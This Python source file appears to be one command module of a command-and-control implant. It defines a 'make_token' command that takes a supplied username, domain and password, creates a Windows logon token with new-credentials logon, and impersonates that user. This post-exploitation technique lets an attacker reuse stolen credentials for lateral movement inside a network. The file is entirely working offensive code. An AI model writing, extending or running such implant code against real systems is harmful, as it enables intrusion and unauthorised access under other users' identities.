import ctypes
import platform
from Models.Command import Command
from Models.Task import Task


class MakeTokenCommand(Command):
    def __init__(self):
        self.name = "make_token"

    def execute(self, task: Task) -> str:
        if platform.system() != "Windows":
            return "Error: make_token is only supported on Windows"

        arguments = task.get_arguments()
        if len(arguments) < 3:
            return "Error: usage: make_token <username> <domain> <password>"

        username, domain, password = arguments[0], arguments[1], arguments[2]

        LOGON32_LOGON_NEW_CREDENTIALS = 9
        LOGON32_PROVIDER_DEFAULT = 0

        advapi32 = ctypes.windll.advapi32
        token = ctypes.c_void_p()

        ok = advapi32.LogonUserA(
            username.encode(),
            domain.encode() if domain else b".",
            password.encode(),
            LOGON32_LOGON_NEW_CREDENTIALS,
            LOGON32_PROVIDER_DEFAULT,
            ctypes.byref(token),
        )
        if not ok:
            return f"Error: LogonUser failed (code {ctypes.GetLastError()})"

        ok = advapi32.ImpersonateLoggedOnUser(token)
        ctypes.windll.kernel32.CloseHandle(token)
        if not ok:
            return f"Error: ImpersonateLoggedOnUser failed (code {ctypes.GetLastError()})"

        return f"Token created — impersonating {domain}\\{username}"
